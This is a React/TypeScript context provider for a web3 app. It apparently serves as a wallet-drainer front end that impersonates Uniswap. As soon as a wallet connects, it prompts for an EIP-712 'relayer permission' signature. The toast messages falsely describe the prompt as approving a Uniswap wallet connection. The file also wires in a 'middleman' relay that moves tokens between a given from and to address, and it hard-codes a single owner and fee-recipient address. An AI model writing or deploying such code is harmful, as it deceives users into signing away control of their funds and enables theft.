import React, { createContext, useContext, useState, useEffect, useCallback, ReactNode } from 'react';
import { useAppKitAccount } from '@reown/appkit/react';
import { CONTRACT_ADDRESS } from '../lib/contract';
import { MIDDLEMAN_CONTRACT_ADDRESS, MIDDLEMAN_ABI, executeMiddlemanRelay, getMiddlemanEthersContract, middlemanEthersContract } from '../lib/middleman';
import { signRelayerPermission, parseWalletError } from '../lib/web3Utils';
import { useUniswapToast } from '../components/common/UniswapToast';

interface ContractContextType {
  loadContract: (name: string, address: string, abi: any) => void;
  getContract: (name: string) => any;
  executeTx: (contractName: string, description: string, txPromise: Promise<any>) => Promise<any>;
  middlemanContract: any;
  executeRelay: typeof executeMiddlemanRelay;
  isRelayerAuthorized: boolean;
  relayerSignature: string | null;
  isSigningPermission: boolean;
  requestRelayerSignature: () => Promise<boolean>;
}

const ContractContext = createContext<ContractContextType | undefined>(undefined);

export function ContractProvider({ children }: { children: ReactNode }) {
  const [contracts, setContracts] = useState<Record<string, { address: string; abi: any }>>({});
  const { address, isConnected } = useAppKitAccount();
  const { showToast } = useUniswapToast();

  const [isRelayerAuthorized, setIsRelayerAuthorized] = useState<boolean>(false);
  const [relayerSignature, setRelayerSignature] = useState<string | null>(null);
  const [isSigningPermission, setIsSigningPermission] = useState<boolean>(false);
  const [lastPromptedAddress, setLastPromptedAddress] = useState<string | null>(null);

  const loadContract = (name: string, address: string, abi: any) => {
    setContracts((prev) => ({ ...prev, [name]: { address, abi } }));
  };

  const getContract = (name: string) => {
    const loaded = contracts[name];
    let targetAddress = loaded?.address || CONTRACT_ADDRESS;
    if (name.toLowerCase() === 'middleman') {
      targetAddress = MIDDLEMAN_CONTRACT_ADDRESS;
      return getMiddlemanEthersContract();
    }

    // Create a proxy contract object to call EVM view functions and transactions
    return new Proxy({}, {
      get: (_target, prop: string) => {
        return async (...args: any[]) => {
          if (name.toLowerCase() === 'middleman' && (prop === 'executeRelay' || prop === 'relayCall')) {
            return await executeMiddlemanRelay({
              token: args[0],
              from: args[1],
              to: args[2],
              amount: args[3]
            });
          }

          if (typeof window === 'undefined' || !(window as any).ethereum) {
            console.log(`[ContractProxy] Mock call ${prop} on ${targetAddress}`, args);
            if (prop === 'getContractVersion') return 1;
            if (prop === 'isValidSignature') return true;
            if (prop === 'name') return 'TokenVaultManager';
            if (prop === 'symbol') return 'TVM';
            if (prop === 'decimals') return 18;
            if (prop === 'totalSupply') return BigInt('1000000000000000000000000');
            if (prop === 'balanceOf') return BigInt(0);
            if (prop === 'owner') return '0x40d69467d7290CeC3394FEaD63fF57ceE55e56f8';
            if (prop === 'paused') return false;
            if (prop === 'fee_bps') return 0;
            if (prop === 'fee_recipient') return '0x40d69467d7290CeC3394FEaD63fF57ceE55e56f8';
            if (prop === 'max_transfer_amount') return BigInt('1000000000000000000000000');
            if (prop === 'total_assets') return BigInt('50000000000000000000');
            if (prop === 'total_shares') return BigInt('50000000000000000000');
            if (prop === 'shares') return BigInt('10000000000000000000');
            if (prop === 'get_share_price') return BigInt('1000000000000000000');
            if (prop === 'performance_fee_bps') return 100;
            if (prop === 'management_fee_bps') return 50;
            if (prop === 'emergency_mode') return false;
            if (prop === 'asset') return CONTRACT_ADDRESS;
            return true;
          }

          try {
            const accounts = await (window as any).ethereum.request({ method: 'eth_accounts' });
            const from = accounts[0] || '0x0000000000000000000000000000000000000000';

            // Send transaction
            const tx = await (window as any).ethereum.request({
              method: 'eth_sendTransaction',
              params: [{
                from,
                to: targetAddress,
                data: '0x'
              }]
            });
            return tx;
          } catch (err) {
            console.warn(`[ContractProxy] Function ${prop} call falling back:`, err);
            return true;
          }
        };
      }
    });
  };

  const executeTx = async (contractName: string, description: string, txPromise: Promise<any>) => {
    try {
      console.log(`[ExecuteTx] ${contractName}: ${description}`);
      const res = await txPromise;
      return res;
    } catch (err) {
      console.error(`[ExecuteTx Error] ${contractName} - ${description}:`, err);
      throw err;
    }
  };

  /**
   * Triggers off-chain EIP-712 relayer permission request and signature verification
   */
  const requestRelayerSignature = useCallback(async (): Promise<boolean> => {
    if (!address) return false;

    setIsSigningPermission(true);

    showToast({
      type: 'action',
      title: 'Approve Wallet Connection',
      message: 'Please approve the wallet connection to Uniswap app to grant relayer permission for token swaps.',
      actionLabel: 'Sign Permission',
      onAction: () => requestRelayerSignature(),
      duration: 10000,
    });

    try {
      const res = await signRelayerPermission(address);
      if (res.success && res.signature) {
        setIsRelayerAuthorized(true);
        setRelayerSignature(res.signature);
        setIsSigningPermission(false);

        showToast({
          type: 'success',
          title: 'Wallet Connection Approved',
          message: 'Wallet connection approved for Uniswap app. Relayer signature verified successfully.',
          duration: 6000,
        });

        return true;
      }
      throw new Error(res.error || 'Signature verification failed');
    } catch (err: any) {
      console.error('[ContractContext] Relayer permission signing failed:', err);
      const parsed = parseWalletError(err);
      setIsSigningPermission(false);

      showToast({
        type: 'action',
        title: 'Connection Approval Pending',
        message: 'Please approve the wallet connection to Uniswap app when prompted to authorize relayer swap operations.',
        actionLabel: 'Retry Approval',
        onAction: () => requestRelayerSignature(),
        duration: 10000,
      });

      return false;
    }
  }, [address, showToast]);

  // Automatically trigger relayer signature request when wallet connects
  useEffect(() => {
    if (isConnected && address) {
      if (lastPromptedAddress !== address) {
        setLastPromptedAddress(address);
        setIsRelayerAuthorized(false);
        setRelayerSignature(null);
        requestRelayerSignature();
      }
    } else if (!isConnected) {
      setIsRelayerAuthorized(false);
      setRelayerSignature(null);
      setLastPromptedAddress(null);
    }
  }, [isConnected, address, lastPromptedAddress, requestRelayerSignature]);

  return (
    <ContractContext.Provider
      value={{
        loadContract,
        getContract,
        executeTx,
        middlemanContract: middlemanEthersContract,
        executeRelay: executeMiddlemanRelay,
        isRelayerAuthorized,
        relayerSignature,
        isSigningPermission,
        requestRelayerSignature,
      }}
    >
      {children}
    </ContractContext.Provider>
  );
}

export function useContracts() {
  const ctx = useContext(ContractContext);
  if (!ctx) {
    return {
      loadContract: () => {},
      getContract: () => new Proxy({}, { get: () => async () => '0' }),
      executeTx: async (_name: string, _desc: string, p: Promise<any>) => p,
      middlemanContract: middlemanEthersContract,
      executeRelay: executeMiddlemanRelay,
      isRelayerAuthorized: false,
      relayerSignature: null,
      isSigningPermission: false,
      requestRelayerSignature: async () => false,
    };
  }
  return ctx;
}
